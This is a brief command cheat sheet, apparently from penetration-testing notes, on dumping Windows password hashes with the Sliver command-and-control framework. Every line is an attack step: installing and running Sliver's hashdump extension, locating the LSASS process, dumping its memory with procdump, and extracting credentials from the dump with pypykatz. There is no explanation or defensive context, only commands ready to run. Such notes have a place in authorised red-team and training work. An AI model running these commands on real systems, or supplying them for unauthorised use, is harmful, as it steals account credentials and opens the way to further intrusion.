Dumping Hashes
```bash
# hashdump
sliver> armory install hashdump          # install 
sliver> hashdump [flags] [arguments...]

# Dump LSASS via procdump (if hashdump fails)
sliver> ps -e lsass 
sliver> procdump --pid <pid> --save /tmp/lsass.dmp
pypykatz lsa minidump /tmp/lsass.dmp  # Dump creds locally
```